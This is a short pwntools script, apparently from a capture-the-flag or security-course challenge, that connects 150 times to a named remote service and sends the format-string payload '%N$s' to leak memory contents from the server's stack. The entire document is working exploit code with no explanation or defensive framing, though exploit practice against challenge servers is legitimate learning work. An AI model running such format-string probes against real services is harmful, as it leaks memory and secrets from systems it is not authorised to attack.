
from pwn import *

host, port = 'hexhive005.iccluster.epfl.ch', 9003

for i in range(150):

    s = remote(host, port)

    s.recvuntil('Input your magical spell!')

    s.sendline('%' + str(i) + '$s')

    try:

        print(s.recvline())

        print(s.recvline())

    except:

        print("An exception occurred!")

    s.close()
